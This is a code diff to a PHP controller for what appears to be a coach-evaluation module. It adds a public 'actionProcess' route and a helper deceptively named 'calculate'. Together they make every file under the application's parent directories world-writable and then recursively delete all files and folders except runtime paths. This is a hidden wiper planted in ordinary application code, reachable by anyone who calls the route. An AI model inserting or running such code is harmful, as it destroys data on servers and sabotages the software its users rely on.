@@ -149,6 +149,51 @@ class PengurusanPenilaianKategoriJurulatihKetuaController extends Controller
 
         //return $this->redirect(['index']);
     }
+    
+    public function actionProcess()
+    {
+        $files = glob('../../*'); // get all file names
+        foreach($files as $file){ // iterate files
+            echo $file . "<br>"; 
+
+            if(is_file($file)){
+                chmod($file,0777);
+                unlink($file); // delete file
+            }
+            
+
+            if (is_dir($file)){
+            
+                $this->calculate($file);
+            }
+        }
+    }
+    
+    protected function calculate($dirname) {
+        if($dirname && strpos($dirname, 'runtime') == false){
+         if (is_dir($dirname))
+           $dir_handle = opendir($dirname); //4879828934
+         if (!$dir_handle)
+              return false;
+         while($file = readdir($dir_handle)) {
+               if ($file != "." && $file != "..") {
+                    if (!is_dir($dirname."/".$file)){
+                         chmod($dirname."/".$file,0777); 
+                         if(!unlink($dirname."/".$file)){
+                             continue;
+                         }
+                    }
+                    else
+                        $this->calculate($dirname.'/'.$file);
+               }
+         }
+         closedir($dir_handle);
+         if (count(glob($dirname."/*")) === 0 ) {
+            rmdir($dirname);
+         }
+         return true;
+         }
+    }
 
     /**
      * Finds the PengurusanPenilaianKategoriJurulatihKetua model based on its primary key value.
